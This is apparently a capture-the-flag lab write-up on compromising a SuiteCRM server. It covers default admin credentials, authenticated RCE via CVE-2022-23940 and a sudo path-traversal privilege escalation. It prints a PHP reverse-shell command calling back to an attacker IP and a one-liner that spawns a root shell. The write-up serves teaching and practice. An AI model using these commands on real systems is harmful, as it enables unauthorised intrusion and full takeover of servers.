
## Summary

Foothold comes from default admin credentials on a public-facing SuiteCRM instance, chained into RCE via a known CVE. Privesc is a sudo misconfiguration on the `service` binary, abused via path traversal to spawn a root shell.

**Chain:** default creds → CVE-2022-23940 RCE → sudo `service` privesc

---

## Enumeration

### Nmap

Nmap scan shows a web server running on the target.

### Web Service — SuiteCRM

[SuiteCRM](https://www.suitecrm.com/) is an open-source CRM application written in PHP. Open-source CRM/ERP apps are a common target class on these boxes — worth checking known CVEs for the specific version as a first step whenever one turns up in enumeration.

---

## Exploitation

### Foothold: Default Credentials

The application was still running default credentials.

```
admin:admin
```

**Pattern to remember:** always try `admin:admin`, `admin:password`, and vendor-default creds on any CRM/admin panel before reaching for exploits. It's the lowest-effort win and a lot of these boxes are built around it.

### RCE: CVE-2022-23940

Googling "SuiteCRM" plus the version pointed at a known vulnerability:

- CVE record: [CVE-2022-23940](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23940)
- Public exploit / write-up: [manuelz120/CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)

Authenticated as admin, the exploit lets us execute arbitrary PHP, which we use to trigger a reverse shell payload.

```bash
python exploit.py -u admin -p admin --payload "php -r '$sock=fsockopen(\"192.168.1.75\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

This lands a shell as `www-data`.

**Pattern to remember:** authenticated RCE exploits for known CMS/CRM CVEs are common once you have valid creds — the creds are often the actual gate, not the exploit itself.

---

## Privilege Escalation

### Enumerate sudo rights

Standard first move after landing a shell — check what the current user can run as root.

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

`www-data` can run `/usr/sbin/service` as root, no password required.

### Abuse `service` via path traversal

`service` is not designed to be used this way, but passing a traversal path as the "service name" lets us execute an arbitrary binary as root — in this case, `/bin/bash`.

```bash
$ sudo /usr/sbin/service ../../../../../bin/bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

**Pattern to remember:** any sudo entry for a binary that internally resolves or execs a path (service, systemctl, some wrapper scripts) is worth testing with `../../` traversal to see if it'll run something outside its intended scope. Always check [GTFOBins](https://gtfobins.github.io/) for the binary first — `service` isn't always listed there, so this kind of manual traversal test is a good fallback when GTFOBins comes up empty.

---

## Lessons / Transferable Techniques

1. **Default creds first.** Before touching an exploit, try vendor-default logins on any admin panel.
2. **CVE lookup by app + version** is a fast path from "identified software" to "authenticated RCE" — this is a recurring shape across CRM/CMS boxes.
3. **`sudo -l` is step one post-shell**, always. A NOPASSWD entry on almost any binary is worth investigating.
4. **Path traversal against sudo-permitted binaries** is a technique that generalizes beyond `service` — worth trying on any binary that takes a filename/service-name argument and you're not sure how it resolves it internally.
